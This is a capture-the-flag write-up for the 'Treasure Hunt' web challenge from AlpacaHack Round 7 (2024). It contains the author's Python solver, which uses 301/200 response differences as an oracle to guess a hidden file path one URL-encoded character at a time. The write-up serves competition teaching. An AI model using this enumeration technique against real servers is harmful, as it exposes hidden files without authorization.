---
title: "Treasure Hunt - AlpacaHack Round 7 2024"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "treasure", "hunt", "web", "alpacahack-round-7"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_AlpacaHack_Round_7/web/treasure-hunt"
license: "none stated"
ctf:
  name: "AlpacaHack Round 7"
  year: 2024
  challenge: "Treasure Hunt"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_AlpacaHack_Round_7/web/treasure-hunt>
- **CTF:** AlpacaHack Round 7 2024

---

# [web] Treasure Hunt

## Description

Can you find a treasure?

## Attachments

- [treasure-hunt](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_AlpacaHack_Round_7/web/treasure-hunt/solution/exploit.py>

```python
import os
import httpx

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))

BASE_URL = f"http://{HOST}:{PORT}"

client = httpx.Client(base_url=BASE_URL)

chars = "0123456789abcdef" + "flagtxt"

known = []
while True:
    print(known)
    for c in chars:
        path = "/".join(["%" + hex(ord(x))[2:].zfill(2).upper() for x in known + [c]])
        res = client.get(path, follow_redirects=False)
        if res.status_code == 200:
            print(res.text)
            exit(0)
        if res.status_code == 301:
            known.append(c)
            break
    else:
        print("Failed")
        exit(1)
```
